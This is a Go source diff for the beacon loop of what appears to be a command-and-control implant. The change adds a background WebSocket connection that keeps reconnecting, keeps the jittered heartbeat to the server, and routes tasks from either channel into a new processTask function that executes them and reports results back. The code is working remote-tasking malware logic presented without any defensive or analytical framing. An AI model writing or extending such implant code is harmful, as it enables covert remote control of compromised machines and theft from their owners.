@@ -14,9 +14,28 @@ import (
 )
 
 // Loop runs the main beacon loop forever
-func Loop(client *comms.Client, cfg *config.Config) error {
+// Loop runs the main beacon loop forever
+func Loop(client *comms.Client, wsClient *comms.WSClient, cfg *config.Config) error {
 	log.Println("[BEACON] Starting beacon loop...")
 	log.Printf("[BEACON] Interval: %d-%ds (jitter)\n", cfg.BeaconMin, cfg.BeaconMax)
+
+	// Start WebSocket connection in background
+	go func() {
+		for {
+			err := wsClient.Connect()
+			if err == nil {
+				// Wait for connection to close
+				for {
+					if wsClient.Conn == nil {
+						break
+					}
+					time.Sleep(5 * time.Second)
+				}
+			}
+			log.Printf("[WS] Disconnected, retrying in 10s...\n")
+			time.Sleep(10 * time.Second)
+		}
+	}()
 
 	// Perform initial beacon immediately
 	log.Println("[BEACON] Performing initial heartbeat...")
@@ -26,50 +45,58 @@ func Loop(client *comms.Client, cfg *config.Config) error {
 	}
 
 	for {
-		// Sleep with jitter
+		// Calculate next sleep
 		sleepDuration := randomInterval(cfg.BeaconMin, cfg.BeaconMax)
-		log.Printf("[BEACON] Sleeping %ds...\n", int(sleepDuration.Seconds()))
-		time.Sleep(sleepDuration)
+		log.Printf("[BEACON] Next heartbeat in %ds...\n", int(sleepDuration.Seconds()))
+		
+		timer := time.NewTimer(sleepDuration)
 
-		// Send beacon
-		log.Println("[BEACON] Sending heartbeat...")
-		resp, err := client.Beacon()
-		if err != nil {
-			log.Printf("[BEACON] Error: %v\n", err)
-			
-			// If we get a 403, our identity is likely invalid
-			if strings.Contains(err.Error(), "HTTP 403") {
-				return fmt.Errorf("identity invalid (403): %w", err)
+		select {
+		case <-timer.C:
+			// Regular beacon
+			log.Println("[BEACON] Sending heartbeat...")
+			resp, err := client.Beacon()
+			if err != nil {
+				log.Printf("[BEACON] Error: %v\n", err)
+				if strings.Contains(err.Error(), "HTTP 403") {
+					return fmt.Errorf("identity invalid (403): %w", err)
+				}
+				continue
 			}
-			continue
-		}
 
-		// Check for task
-		if resp.Task == nil {
-			log.Println("[BEACON] No tasks pending")
-			continue
-		}
+			if resp.Task != nil {
+				processTask(resp.Task, client, cfg)
+			}
 
-		task := resp.Task
-		log.Printf("[TASK] Received: type=%s id=%s\n", task.Type, task.ID[:8])
-
-		// Handle sleep_update specially (changes beacon config)
-		if task.Type == "sleep_update" {
-			handleSleepUpdate(task, cfg)
-		}
-
-		// Execute the task
-		result := executor.Execute(task, client.APIKey)
-		log.Printf("[TASK] Completed: status=%s\n", result.Status)
-
-		// Send result back
-		if err := client.SendResult(result); err != nil {
-			log.Printf("[RESULT] Failed to send: %v\n", err)
-		} else {
-			log.Println("[RESULT] Sent successfully")
+		case task := <-wsClient.TaskChan:
+			// Real-time task via WebSocket
+			log.Printf("[WS] Processing real-time task: %s\n", task.ID[:8])
+			processTask(task, client, cfg)
 		}
 	}
 }
+
+// processTask handles task execution and result reporting
+func processTask(task *comms.TaskPayload, client *comms.Client, cfg *config.Config) {
+	log.Printf("[TASK] Received: type=%s id=%s\n", task.Type, task.ID[:8])
+
+	// Handle sleep_update specially
+	if task.Type == "sleep_update" {
+		handleSleepUpdate(task, cfg)
+	}
+
+	// Execute the task
+	result := executor.Execute(task, client.APIKey)
+	log.Printf("[TASK] Completed: status=%s\n", result.Status)
+
+	// Send result back
+	if err := client.SendResult(result); err != nil {
+		log.Printf("[RESULT] Failed to send: %v\n", err)
+	} else {
+		log.Println("[RESULT] Sent successfully")
+	}
+}
+
 
 // handleSleepUpdate updates the beacon interval from a task payload
 func handleSleepUpdate(task *comms.TaskPayload, cfg *config.Config) {
